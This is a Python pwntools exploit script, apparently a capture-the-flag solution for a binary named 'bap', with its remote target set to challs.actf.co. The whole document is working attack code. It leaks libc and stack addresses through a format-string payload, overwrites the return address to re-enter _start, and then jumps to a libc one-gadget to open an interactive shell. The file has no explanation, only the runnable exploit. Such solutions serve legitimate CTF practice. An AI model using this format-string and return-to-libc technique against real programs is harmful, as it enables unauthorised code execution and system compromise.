#!/usr/bin/env python3

from pwn import *

exe = ELF("./bap_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.terminal = ["tmux", "splitw", "-h"]
context.binary = exe


def conn():
    if args.REMOTE:
        r = remote("challs.actf.co", 31323)
    else:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(
                    r,
                    gdbscript='''
                        b *main+81
                        b *main+88
                    ''')
    return r


r = conn()

payload = b"%29$p %13$p |"
payload += b"A" * (24 - len(payload)) + p64(exe.sym._start)
r.sendlineafter(b": ", payload)

[libc_leak, stack_leak] = [int(leak, 16) for leak in r.recvuntil(b"|").split(b" ")[:-1]]
libc.address = libc_leak - 0x29e40
stack_leak += 0x78
log.info(hex(libc.address))

payload = b"\0" * 16 + p64(stack_leak) + p64(libc.address + 0xebcf5)
r.sendlineafter(b": ", payload)

r.interactive()
